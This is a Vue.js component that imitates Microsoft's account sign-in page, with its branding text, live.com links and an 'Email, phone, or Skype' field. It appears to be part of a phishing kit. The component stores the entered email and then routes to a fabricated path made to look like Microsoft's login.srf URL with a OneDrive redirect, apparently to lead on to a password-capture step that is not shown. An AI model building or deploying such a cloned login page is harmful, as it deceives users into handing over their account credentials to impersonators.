<template>
<div class="bckgrd">
    
<div >
   <v-flex 
   xs12 
   sm12
    md12
    layout
   justify-center

   >
   <v-card class="login-card" flat > 
      <img src="../assets/ml.svg" alt="" width="110px">
      <br><br>
   <h1>Sign in</h1>
     <v-flex xs12 sm12 md12>
          <v-text-field
          v-model = "Email"
            placeholder="Email, phone, or Skype"
          ></v-text-field>
        </v-flex>
          <span style="font-size:14px;margin-right:10px;"> No account?</span> <span style="color:#0b68b4;"><a style="font-size:14px;text-decoration:none" href="https://signup.live.com/?lic=1">Create one!</a> </span>
        <br><br>
        <span style="color:#0b68b4;"> <a style="font-size:14px;text-decoration:none" href="https://account.live.com/password/reset"> Can't access your account?</a> </span>
        <br><br>
        
        <button class="next-btn" @click="mutateEmail">Next</button>
   </v-card>
   </v-flex>

</div>
</div>
</template>

<script>

  export default {
      data(){
          return{
          Email: null,
          }
      },

    methods:{
     mutateEmail(){
      this.$store.commit('mutateEmail', this.Email) 
      this.$router.push('/login-srf&wa-wsignin-0&rpsnv13&ct=1573432251&rve-=7.1.6819.0&wp-MBI_SSL_SHARED&wreply-https-%2F%2Fonedrive-live-com')
    }
  }
}
</script>

<style scoped>
.next-btn {background: #0b68b4 ; padding: 5px;width: 100px; color: white;float: right;}
h1 {font-size: 25px;}
.bckgrd {height:100vh;background-image: url('../assets/bg2.jpg');background-size: cover;padding: 165px 0px 0px 0px ;}
.login-card {padding: 40px; height: 350px; width:450px; color: rgb(73, 73, 73);}
</style>
